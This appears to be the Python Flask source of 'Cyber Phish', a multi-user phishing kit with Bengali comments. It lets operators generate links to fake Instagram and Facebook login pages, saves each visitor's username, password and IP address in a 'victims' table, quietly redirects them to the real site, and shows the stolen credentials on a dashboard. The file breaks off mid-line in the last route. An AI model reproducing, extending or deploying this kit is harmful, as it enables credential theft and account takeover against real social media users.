import os
import uuid
import sqlite3
from datetime import datetime, timedelta
from flask import Flask, request, render_template_string, redirect, url_for, session

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'default-fallback-secret-key-2026')
app.permanent_session_lifetime = timedelta(days=30)

DB_NAME = 'phish_data.db'

# ----------------- ডাটাবেস -----------------
def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS links (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        link_id TEXT UNIQUE,
        template TEXT,
        created_at TIMESTAMP,
        FOREIGN KEY (user_id) REFERENCES users (id)
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS victims (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        link_id TEXT,
        username TEXT,
        password TEXT,
        ip TEXT,
        submitted_at TIMESTAMP,
        FOREIGN KEY (link_id) REFERENCES links (link_id)
    )''')
    conn.commit()
    conn.close()

init_db()

# ----------------- HTML টেমপ্লেট (স্টাইল সরাসরি এমবেড করা) -----------------
REGISTER_HTML = '''
<!DOCTYPE html>
<html>
<head><title>Cyber Phish - Register</title><meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background: linear-gradient(135deg, #0a0f1e 0%, #0c1222 100%); font-family: 'Segoe UI', 'Poppins', system-ui, sans-serif; min-height: 100vh; color: #e0e0e0; }
    .container { max-width: 1400px; margin: 0 auto; padding: 30px 20px; }
    .glass-card { background: rgba(20, 28, 40, 0.7); backdrop-filter: blur(12px); border-radius: 32px; border: 1px solid rgba(0, 255, 255, 0.2); box-shadow: 0 25px 45px rgba(0, 0, 0, 0.3); padding: 40px; }
    .brand { font-size: 2.5rem; font-weight: 800; text-align: center; margin-bottom: 30px; text-shadow: 0 0 10px cyan; }
    h2 { background: linear-gradient(135deg, #00ffff, #ff00ff); -webkit-background-clip: text; background-clip: text; color: transparent; margin-bottom: 20px; }
    input, button { width: 100%; padding: 14px 18px; margin: 12px 0; border-radius: 50px; border: none; background: rgba(10, 15, 30, 0.8); color: white; font-size: 1.1rem; }
    button { background: linear-gradient(95deg, #00aaff, #0066cc); cursor: pointer; font-weight: bold; }
    button:hover { transform: scale(0.98); }
    a { color: #00ffff; text-decoration: none; }
    @media (max-width: 768px) { .glass-card { padding: 20px; } .brand { font-size: 1.8rem; } }
</style>
</head>
<body>
<div class="container"><div class="glass-card" style="max-width:500px;margin:auto;">
<div class="brand">🔐 CYBER PHISH</div><h2>Register</h2>
<form method="post">
    <input type="text" name="username" placeholder="Username" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Register</button>
</form>
<div style="text-align:center;margin-top:20px;"><a href="/login">Already have an account? Login</a></div>
</div></div>
</body>
</html>
'''

LOGIN_HTML = '''
<!DOCTYPE html>
<html>
<head><title>Cyber Phish - Login</title><meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background: linear-gradient(135deg, #0a0f1e 0%, #0c1222 100%); font-family: 'Segoe UI', 'Poppins', system-ui, sans-serif; min-height: 100vh; color: #e0e0e0; }
    .container { max-width: 1400px; margin: 0 auto; padding: 30px 20px; }
    .glass-card { background: rgba(20, 28, 40, 0.7); backdrop-filter: blur(12px); border-radius: 32px; border: 1px solid rgba(0, 255, 255, 0.2); box-shadow: 0 25px 45px rgba(0, 0, 0, 0.3); padding: 40px; }
    .brand { font-size: 2.5rem; font-weight: 800; text-align: center; margin-bottom: 30px; text-shadow: 0 0 10px cyan; }
    h2 { background: linear-gradient(135deg, #00ffff, #ff00ff); -webkit-background-clip: text; background-clip: text; color: transparent; margin-bottom: 20px; }
    input, button { width: 100%; padding: 14px 18px; margin: 12px 0; border-radius: 50px; border: none; background: rgba(10, 15, 30, 0.8); color: white; font-size: 1.1rem; }
    button { background: linear-gradient(95deg, #00aaff, #0066cc); cursor: pointer; font-weight: bold; }
    button:hover { transform: scale(0.98); }
    a { color: #00ffff; text-decoration: none; }
    @media (max-width: 768px) { .glass-card { padding: 20px; } .brand { font-size: 1.8rem; } }
</style>
</head>
<body>
<div class="container"><div class="glass-card" style="max-width:500px;margin:auto;">
<div class="brand">🔐 CYBER PHISH</div><h2>Login</h2>
<form method="post">
    <input type="text" name="username" placeholder="Username" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Login</button>
</form>
<div style="text-align:center;margin-top:20px;"><a href="/register">Create new account</a></div>
</div></div>
</body>
</html>
'''

DASHBOARD_HTML = '''
<!DOCTYPE html>
<html>
<head><title>Cyber Phish - Dashboard</title><meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background: linear-gradient(135deg, #0a0f1e 0%, #0c1222 100%); font-family: 'Segoe UI', 'Poppins', system-ui, sans-serif; min-height: 100vh; color: #e0e0e0; }
    .container { max-width: 1400px; margin: 0 auto; padding: 30px 20px; }
    .glass-card { background: rgba(20, 28, 40, 0.7); backdrop-filter: blur(12px); border-radius: 32px; border: 1px solid rgba(0, 255, 255, 0.2); box-shadow: 0 25px 45px rgba(0, 0, 0, 0.3); padding: 40px; }
    .brand { font-size: 2.5rem; font-weight: 800; text-align: center; margin-bottom: 30px; text-shadow: 0 0 10px cyan; }
    h2, h3 { background: linear-gradient(135deg, #00ffff, #ff00ff); -webkit-background-clip: text; background-clip: text; color: transparent; margin-bottom: 20px; }
    .flex-between { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 15px; }
    .btn-small { display: inline-block; background: #2c3e50; padding: 8px 20px; border-radius: 40px; font-size: 1rem; color: #00ffff; text-decoration: none; }
    .link-card { background: rgba(0, 0, 0, 0.4); border-radius: 28px; padding: 20px; margin-bottom: 20px; border-left: 5px solid cyan; }
    .badge { background: #ff00ff; padding: 6px 14px; border-radius: 40px; font-size: 0.8rem; display: inline-block; margin-right: 15px; }
    code { word-break: break-all; }
    .logout { text-align: right; margin-bottom: 20px; }
    a { color: #00ffff; text-decoration: none; }
    @media (max-width: 768px) { .glass-card { padding: 20px; } .brand { font-size: 1.8rem; } }
</style>
</head>
<body>
<div class="container">
    <div class="logout"><a href="/logout">🚪 Logout</a></div>
    <div class="glass-card">
        <div class="brand">🔐 CYBER PHISH</div>
        <div class="flex-between">
            <h2>Dashboard, {{ user }}</h2>
            <a href="/create_link" class="btn-small">➕ New Link</a>
        </div>
        <h3>Your Phishing Links</h3>
        {% for link in links %}
        <div class="link-card">
            <span class="badge">{{ link.template.upper() }}</span>
            <code>{{ host_url }}f/{{ link.link_id }}</code>
            <div class="flex-between">
                <small>Created: {{ link.created_at }}</small>
                <a href="/victims/{{ link.link_id }}">👁️ View Victims</a>
            </div>
        </div>
        {% else %}
        <p>No links yet. Click "New Link" to start.</p>
        {% endfor %}
    </div>
</div>
</body>
</html>
'''

CREATE_LINK_HTML = '''
<!DOCTYPE html>
<html>
<head><title>Cyber Phish - Create Link</title><meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background: linear-gradient(135deg, #0a0f1e 0%, #0c1222 100%); font-family: 'Segoe UI', 'Poppins', system-ui, sans-serif; min-height: 100vh; color: #e0e0e0; }
    .container { max-width: 1400px; margin: 0 auto; padding: 30px 20px; }
    .glass-card { background: rgba(20, 28, 40, 0.7); backdrop-filter: blur(12px); border-radius: 32px; border: 1px solid rgba(0, 255, 255, 0.2); box-shadow: 0 25px 45px rgba(0, 0, 0, 0.3); padding: 40px; }
    .brand { font-size: 2.5rem; font-weight: 800; text-align: center; margin-bottom: 30px; text-shadow: 0 0 10px cyan; }
    h2 { background: linear-gradient(135deg, #00ffff, #ff00ff); -webkit-background-clip: text; background-clip: text; color: transparent; margin-bottom: 20px; }
    select, button { width: 100%; padding: 14px 18px; margin: 12px 0; border-radius: 50px; border: none; background: rgba(10, 15, 30, 0.8); color: white; font-size: 1.1rem; }
    button { background: linear-gradient(95deg, #00aaff, #0066cc); cursor: pointer; font-weight: bold; }
    a { color: #00ffff; text-decoration: none; }
    @media (max-width: 768px) { .glass-card { padding: 20px; } .brand { font-size: 1.8rem; } }
</style>
</head>
<body>
<div class="container"><div class="glass-card" style="max-width:600px;margin:auto;">
<div class="brand">🔐 CYBER PHISH</div><h2>Generate New Link</h2>
<form method="post">
    <select name="template" required>
        <option value="instagram">Instagram</option>
        <option value="facebook">Facebook</option>
    </select>
    <button type="submit">Generate</button>
</form>
<div style="text-align:center;margin-top:20px;"><a href="/dashboard">⬅ Back</a></div>
</div></div>
</body>
</html>
'''

INSTAGRAM_PAGE = '''
<!DOCTYPE html>
<html>
<head><title>Cyber Phish - Instagram</title><meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background: linear-gradient(135deg, #0a0f1e 0%, #0c1222 100%); font-family: 'Segoe UI', 'Poppins', system-ui, sans-serif; min-height: 100vh; color: #e0e0e0; }
    .container { max-width: 1400px; margin: 0 auto; padding: 30px 20px; }
    .glass-card { background: rgba(20, 28, 40, 0.7); backdrop-filter: blur(12px); border-radius: 32px; border: 1px solid rgba(0, 255, 255, 0.2); box-shadow: 0 25px 45px rgba(0, 0, 0, 0.3); padding: 40px; }
    .brand { font-size: 2.5rem; font-weight: 800; text-align: center; margin-bottom: 30px; text-shadow: 0 0 10px cyan; }
    h2 { text-align:center; background: linear-gradient(135deg, #00ffff, #ff00ff); -webkit-background-clip: text; background-clip: text; color: transparent; margin-bottom: 20px; }
    input, button { width: 100%; padding: 14px 18px; margin: 12px 0; border-radius: 50px; border: none; background: rgba(10, 15, 30, 0.8); color: white; font-size: 1.1rem; }
    button { background: linear-gradient(95deg, #00aaff, #0066cc); cursor: pointer; font-weight: bold; }
    @media (max-width: 768px) { .glass-card { padding: 20px; } .brand { font-size: 1.8rem; } }
</style>
</head>
<body>
<div class="container"><div class="glass-card" style="max-width:500px;margin:auto;">
<div class="brand">🔐 CYBER PHISH</div><h2>Instagram Login</h2>
<form method="post">
    <input type="text" name="username" placeholder="Phone number, username, or email" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Log In</button>
</form>
</div></div>
</body>
</html>
'''

FACEBOOK_PAGE = '''
<!DOCTYPE html>
<html>
<head><title>Cyber Phish - Facebook</title><meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background: linear-gradient(135deg, #0a0f1e 0%, #0c1222 100%); font-family: 'Segoe UI', 'Poppins', system-ui, sans-serif; min-height: 100vh; color: #e0e0e0; }
    .container { max-width: 1400px; margin: 0 auto; padding: 30px 20px; }
    .glass-card { background: rgba(20, 28, 40, 0.7); backdrop-filter: blur(12px); border-radius: 32px; border: 1px solid rgba(0, 255, 255, 0.2); box-shadow: 0 25px 45px rgba(0, 0, 0, 0.3); padding: 40px; }
    .brand { font-size: 2.5rem; font-weight: 800; text-align: center; margin-bottom: 30px; text-shadow: 0 0 10px cyan; }
    h2 { text-align:center; background: linear-gradient(135deg, #00ffff, #ff00ff); -webkit-background-clip: text; background-clip: text; color: transparent; margin-bottom: 20px; }
    input, button { width: 100%; padding: 14px 18px; margin: 12px 0; border-radius: 50px; border: none; background: rgba(10, 15, 30, 0.8); color: white; font-size: 1.1rem; }
    button { background: linear-gradient(95deg, #00aaff, #0066cc); cursor: pointer; font-weight: bold; }
    @media (max-width: 768px) { .glass-card { padding: 20px; } .brand { font-size: 1.8rem; } }
</style>
</head>
<body>
<div class="container"><div class="glass-card" style="max-width:500px;margin:auto;">
<div class="brand">🔐 CYBER PHISH</div><h2>Facebook Login</h2>
<form method="post">
    <input type="text" name="username" placeholder="Email or Phone" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Log In</button>
</form>
</div></div>
</body>
</html>
'''

VICTIMS_HTML = '''
<!DOCTYPE html>
<html>
<head><title>Cyber Phish - Victims</title><meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background: linear-gradient(135deg, #0a0f1e 0%, #0c1222 100%); font-family: 'Segoe UI', 'Poppins', system-ui, sans-serif; min-height: 100vh; color: #e0e0e0; }
    .container { max-width: 1400px; margin: 0 auto; padding: 30px 20px; }
    .glass-card { background: rgba(20, 28, 40, 0.7); backdrop-filter: blur(12px); border-radius: 32px; border: 1px solid rgba(0, 255, 255, 0.2); box-shadow: 0 25px 45px rgba(0, 0, 0, 0.3); padding: 40px; }
    .brand { font-size: 2.5rem; font-weight: 800; text-align: center; margin-bottom: 30px; text-shadow: 0 0 10px cyan; }
    h2 { background: linear-gradient(135deg, #00ffff, #ff00ff); -webkit-background-clip: text; background-clip: text; color: transparent; margin-bottom: 20px; }
    .flex-between { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 15px; }
    .btn-small { display: inline-block; background: #2c3e50; padding: 8px 20px; border-radius: 40px; font-size: 1rem; color: #00ffff; text-decoration: none; }
    table { width: 100%; border-collapse: collapse; background: rgba(0,0,0,0.3); border-radius: 20px; }
    th, td { padding: 15px; text-align: left; border-bottom: 1px solid #2a3246; }
    th { background: #1e2a3a; }
    code { background: #000; padding: 4px 8px; border-radius: 8px; }
    @media (max-width: 768px) { .glass-card { padding: 20px; } .brand { font-size: 1.8rem; } }
</style>
</head>
<body>
<div class="container">
    <div class="glass-card">
        <div class="brand">🔐 CYBER PHISH</div>
        <div class="flex-between">
            <h2>Captured Data</h2>
            <a href="/dashboard" class="btn-small">⬅ Back</a>
        </div>
        <p><strong>Link ID:</strong> <code>{{ link_id }}</code></p>
        <div style="overflow-x:auto;">
        <table>
            <thead><tr><th>Username/Email</th><th>Password</th><th>IP</th><th>Time</th></tr></thead>
            <tbody>
            {% for v in victims %}
            <tr><td>{{ v.username }}</td><td>{{ v.password }}</td><td>{{ v.ip }}</td><td>{{ v.submitted_at }}</td></tr>
            {% else %}
            <tr><td colspan="4">No victims yet. Share your link first.</td></tr>
            {% endfor %}
            </tbody>
        </table>
        </div>
    </div>
</div>
</body>
</html>
'''

# ----------------- রাউট -----------------
@app.route('/')
def home():
    if 'user_id' in session:
        return redirect(url_for('dashboard'))
    return redirect(url_for('login'))

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        try:
            c.execute("INSERT INTO users (username, password) VALUES (?, ?)", (username, password))
            conn.commit()
            conn.close()
            return redirect(url_for('login'))
        except sqlite3.IntegrityError:
            conn.close()
            return "Username already exists. <a href='/register'>Try again</a>"
    return render_template_string(REGISTER_HTML)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        session.permanent = True
        username = request.form['username']
        password = request.form['password']
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute("SELECT id FROM users WHERE username=? AND password=?", (username, password))
        user = c.fetchone()
        conn.close()
        if user:
            session['user_id'] = user[0]
            session['username'] = username
            return redirect(url_for('dashboard'))
        else:
            return "Invalid credentials. <a href='/login'>Try again</a>"
    return render_template_string(LOGIN_HTML)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT link_id, template, created_at FROM links WHERE user_id=?", (session['user_id'],))
    links = [{'link_id': row[0], 'template': row[1], 'created_at': row[2]} for row in c.fetchall()]
    conn.close()
    host_url = request.host_url
    return render_template_string(DASHBOARD_HTML, user=session['username'], links=links, host_url=host_url)

@app.route('/create_link', methods=['GET', 'POST'])
def create_link():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    if request.method == 'POST':
        template = request.form['template']
        link_id = str(uuid.uuid4())[:8]
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute("INSERT INTO links (user_id, link_id, template, created_at) VALUES (?, ?, ?, ?)",
                  (session['user_id'], link_id, template, datetime.now()))
        conn.commit()
        conn.close()
        return redirect(url_for('dashboard'))
    return render_template_string(CREATE_LINK_HTML)

@app.route('/f/<link_id>', methods=['GET', 'POST'])
def phish_page(link_id):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT template FROM links WHERE link_id=?", (link_id,))
    result = c.fetchone()
    if not result:
        conn.close()
        return "Invalid link", 404
    template_name = result[0]
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        ip = request.remote_addr
        c.execute("INSERT INTO victims (link_id, username, password, ip, submitted_at) VALUES (?,?,?,?,?)",
                  (link_id, username, password, ip, datetime.now()))
        conn.commit()
        conn.close()
        real_url = 'https://www.instagram.com' if template_name == 'instagram' else 'https://www.facebook.com'
        return f"<div style='background:#0a0f1e; color:cyan; text-align:center; padding:50px;'>Redirecting...<script>setTimeout(()=>{{window.location.href='{real_url}'}},2000);</script></div>"
    conn.close()
    if template_name == 'instagram':
        return render_template_string(INSTAGRAM_PAGE)
    else:
        return render_template_string(FACEBOOK_PAGE)

@app.route('/victims/<link_id>')
def view_victims(link_id):
    if 'user_id' not in session:
        return redirect(url_for('login